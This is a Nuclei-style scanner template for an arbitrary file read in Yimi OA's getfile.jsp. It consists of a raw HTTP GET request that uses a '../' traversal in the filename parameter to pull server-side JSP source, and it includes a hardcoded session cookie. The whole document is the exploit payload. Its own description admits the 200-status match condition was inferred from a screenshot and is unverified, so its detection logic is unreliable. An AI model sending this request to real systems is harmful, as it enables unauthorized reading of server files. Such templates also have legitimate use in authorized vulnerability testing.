id: poc-1e8c9e93ef456840e044
info:
  name: 一米OAgetfile.jsp任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    Cookie: JSESSIONID=6D52D786191AC0528ECD915A12964B1D

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
